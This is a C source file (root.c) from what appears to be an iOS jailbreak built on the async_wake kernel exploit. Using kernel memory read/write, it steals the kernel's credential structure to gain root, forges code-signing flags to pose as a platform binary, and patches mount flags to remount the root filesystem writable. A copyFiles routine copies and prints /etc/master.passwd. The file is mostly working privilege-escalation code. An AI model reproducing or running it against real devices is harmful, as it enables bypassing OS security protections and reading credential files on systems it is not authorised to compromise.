//
//  root.c
//  async_wake_ios
//
//  Created by Etienne Stalmans on 14/12/2017.
//  Copyright © 2017 Ian Beer. All rights reserved.
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/fcntl.h>
#include <sys/mount.h>

#include "kdbg.h"
#include "kutils.h"
#include "kmem.h"
#include "symbols.h"
#include "kcall.h"
#include "find_port.h"
#include "root.h"

// Thanks to
// Abraham Masri @cheesecakeufo https://gist.github.com/iabem97/d11e61afa7a0d0a9f2b5a1e42ee505d8
// @benjibobs https://github.com/benjibobs/async_wake
// This is all based off of their code and commented with my understanding of what is going on

// this is essentially the exact same function as
// uint64_t find_kernel_vm_map(uint64_t task_self_addr) {
// found in async_wake.c:437
// but we return the bsd_info rather than the vm_map
uint64_t get_process_bsdinfo(uint32_t pid) {
    
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t tpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if (tpid == pid) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
   
    return -1;
}

uint64_t get_process_bsdinfo_from_name(char* procname){
    
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        
        // create a buffer to hold the process name
        char buff [strlen(procname)];
        // read the process name, we only read of strlen("target process")
        rkbuffer(bsd_info+koffset(KSTRUCT_OFFSET_PROC_COMM),buff,(uint32_t)strlen(procname));
        
        //check if it is the pocess we are looking for
        if (strcmp(procname, buff) == 0) {
            return bsd_info;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
    
    return -1;
}

//get the current value of cflags for a given process.
//requires the memory location of the cflags, use get_csflags_loc to retrieve this
uint32_t get_csflags(uint32_t pid){
    uint64_t proc_bsd = get_process_bsdinfo(pid);
    uint32_t csflags = rk32(proc_bsd + koffset(KSTRUCT_OFFSET_CFLAGS));
    return csflags;
}

//sets the csflags of a process. Takes the memory location of the csflags to set
//get the memory location using get_csflags_loc
uint32_t set_csflags(uint32_t pid, uint32_t csflags){
    uint64_t proc_bsd = get_process_bsdinfo(pid);
    wk32(proc_bsd+koffset(KSTRUCT_OFFSET_CFLAGS), csflags);
    return -1;
}

//steals the ucreds from the kernel process and applies them to our target
//pid. After which it should be possible to setuid(0) and get root.
void powerup(uint32_t pid){
    //get the process address for the current process
    printf("Get current process bsd_info\n");
    uint64_t proc_bsd = get_process_bsdinfo(pid);
    if(proc_bsd == -1) {
        printf("Failed to get current process bsd_info\n");
        return ;
    }
    printf("Got bsd_info: %llx\n", proc_bsd);
    
    //get process address for the kernel process
    printf("Get kernel process bsd_info\n");
    uint64_t kernel_bsd = get_process_bsdinfo(0);
    if(kernel_bsd == -1) {
        printf("Failed to get Kernel bsd_info\n");
        return ;
    }
    printf("Got bsd_info: %llx\n", kernel_bsd);
    
    /* KSTRUCT
     * been trying to find an example of what the structs look like
     *
     
     KSTRUCT
     +----------------------------+
     |                            |
     +----------------------------+         +----------------+--------+
     |        BSD_INFO            +-------> | Pid : bsd_info + 0x10   |
     |                            |         |                         |
     +----------------------------+         +-----------------+-------+
     |                            |         | ucred: bsd_info + 0x100 |
     |                            |         |                         |
     |                            |         +---------------------+---+
     |                            |         | Proc_name: bsd_info +   |
     |                            |         |            0x268        |
     |                            |         +--------------------+----+
     |                            |         | cs_flags: bsd_info +    |
     |                            |         |           0x2a8         |
     +----------------------------+         +-------------------------+
     
     
     * bsd_info + 0x100 - holds the user credentails struct
     * I think it is this -->
     * https://github.com/apple/darwin-xnu/blob/5394bb038891708cd4ba748da79b90a33b19f82e/bsd/sys/ucred.h
     *
     * we want to swap out the ucred struct to match that of the kernel. This means our process now has kernel permissions
     */
    //get the ucred from the kernel KStruct
    printf("Extract kernel ucred\n");
    uint64_t kernel_ucred = rk64(kernel_bsd + koffset(KSTRUCT_OFFSET_UCRED));
    printf("Found kernel_ucred: %llx\n", kernel_ucred);
    
    //overwrite the current ucred with the kernel's ucred
    printf("Replacing current ucred with kernel's\n");
    wk64(proc_bsd + koffset(KSTRUCT_OFFSET_UCRED) , kernel_ucred);
    printf("Successfully stole kern_ucred!\n");
}

//wrapper function that elevates the current process to root.
//returns the old uid so that we can drop privileges before exiting and prevent
//mitigations triggering.
uid_t get_root(mach_port_t tfpzero){
    setupKernelDump(tfpzero);
    
    uid_t olduid = getuid();
    printf("Current PID: %d, UID: %d\n",getpid(),olduid);
    
    //powerup the current process by stealing the kernel's ucreds
    powerup(getpid());
    
    //set our uid to root :D
    setuid(0);
    printf("PID: %d, UID: %d\n",getpid(), getuid());
    
    //return the olduid so we can reset it down the line
    return olduid;
}

//restore our uid to the previous uid
void reset_root(uid_t olduid){
    setuid(olduid);
    printf("Reset our UID\n");
    printf("PID: %d, UID: %d\n",getpid(), getuid());
}

void dirList(char* dir){
    DIR *dp;
    struct dirent *ep;
    dp = opendir(dir);
    if (dp != NULL){
        while (ep = readdir(dp)){
            printf("%s\n",ep->d_name);
        }
        (void)closedir(dp);
    } else {
        printf("Failed to open dir\n");
    }
}

uint32_t cpFile(char* source, char* destination){
    uint32_t counter = 0;
    
    int fd_src = open(source, O_RDONLY);
    if (fd_src < 0 ) return -1;
    
    int fd_dst = open(destination, O_WRONLY | O_CREAT | O_EXCL, 0666);
    if (fd_dst < 0 ) {
        close(fd_src);
        return -1;
    }
    char buf[4096];
    ssize_t nread;
    
    while (nread = read(fd_src, buf, sizeof buf), nread > 0)
    {
        char *out_ptr = buf;
        ssize_t nwritten;
        
        do {
            nwritten = write(fd_dst, out_ptr, nread);
            
            if (nwritten >= 0)
            {
                nread -= nwritten;
                out_ptr += nwritten;
                counter += nread;
            }
        } while (nread > 0);
    }

    
    close(fd_src);
    close(fd_dst);
    
    return counter;
}

void printFile(char* src) {
    FILE* fd = fopen(src, "r");
    if (fd < 0) {
        printf("Error opening file\n");
        return;
    }
    char ch;
    
    while( ( ch = fgetc(fd) ) != EOF )
        printf("%c",ch);
    fclose(fd);
    printf("\n");
}

void dumpBsd_Info(){
    uint32_t pid = getpid();
    // task_self_addr points to the struct ipc_port for our task port
    uint64_t task_self = task_self_addr();
    // read the address of the task struct
    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    
    //loop through the task structures to find the task structure for the supplied pid
    while (struct_task != 0 ) {
        // from async_wake.c:440 - where Ian loops to find the kernel vm_map
        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        uint32_t tpid = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
        
        if (tpid == pid) {
            // create a buffer to hold the process name
            char buff [0x400];
            // read the process name, we only read of strlen("target process")
            rkbuffer(bsd_info,buff,(uint32_t)0x400);
            for(int i=0; i<0x400; i++){
                printf("0x%02x ",buff[i]);
            }
            break;
        }
        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
    }
}

void setPlatform(){
    uint32_t c_csflags = get_csflags(getpid());
    printf("Current csflags: 0x%07x\n",c_csflags);
    printf("Setting csflags 'CS_PLATFORM_BINARY'\n");
    uint32_t cflags = (get_csflags(getpid()) | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD );
    set_csflags(getpid(),cflags);
    printf("New csflags: 0x%07x\n",get_csflags(getpid()));
}


uint32_t startBin(){
    return -1;
}

int remountRW(){
    // Remount / as rw - patch by xerub
    // and modified by stek29
    {
        vm_offset_t off = 0xd8;
        uint64_t _rootvnode = find_rootvnode();
        uint64_t rootfs_vnode = rk64(_rootvnode);
        uint64_t v_mount = rk64(rootfs_vnode + off);
        uint32_t v_flag = rk32(v_mount + 0x71);
        
        wk32(v_mount + 0x71, v_flag & ~(1 << 6));
        
        char *nmz = strdup("/dev/disk0s1s1");
        int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
        printf("remounting: %d\n", rv);
        
        v_mount = rk64(rootfs_vnode + off);
        wk32(v_mount + 0x71, v_flag);
        
        //try write to root and see if we have successfully remounted RW
        int fd = open("/.staaldraad", O_RDONLY);
        if (fd == -1) {
            fd = creat("/.staaldraad", 0444);
        } else {
            printf("File already exists!\n");
        }
        close(fd);
        //try open again and if success, file was created on /
        fd = open("/.staaldraad", O_RDONLY);
        if (fd == -1) {
            printf("File doesn't exist... we must have failed!!\n");
            return -1;
        } else {
            //it exists! print message and cleanup
            printf("File exists! We have RW on /\n");
            remove("/.staaldraad");
        }
        close(fd);
        rv = mount("hfs", "/Developer", MNT_UPDATE, (void *)&nmz);
    }
    return 0;
}

void copyFiles(){
    cpFile("/etc/master.passwd", "/tmp/master.bak");
    dirList("/bin");
    printFile("/tmp/master.bak");
}
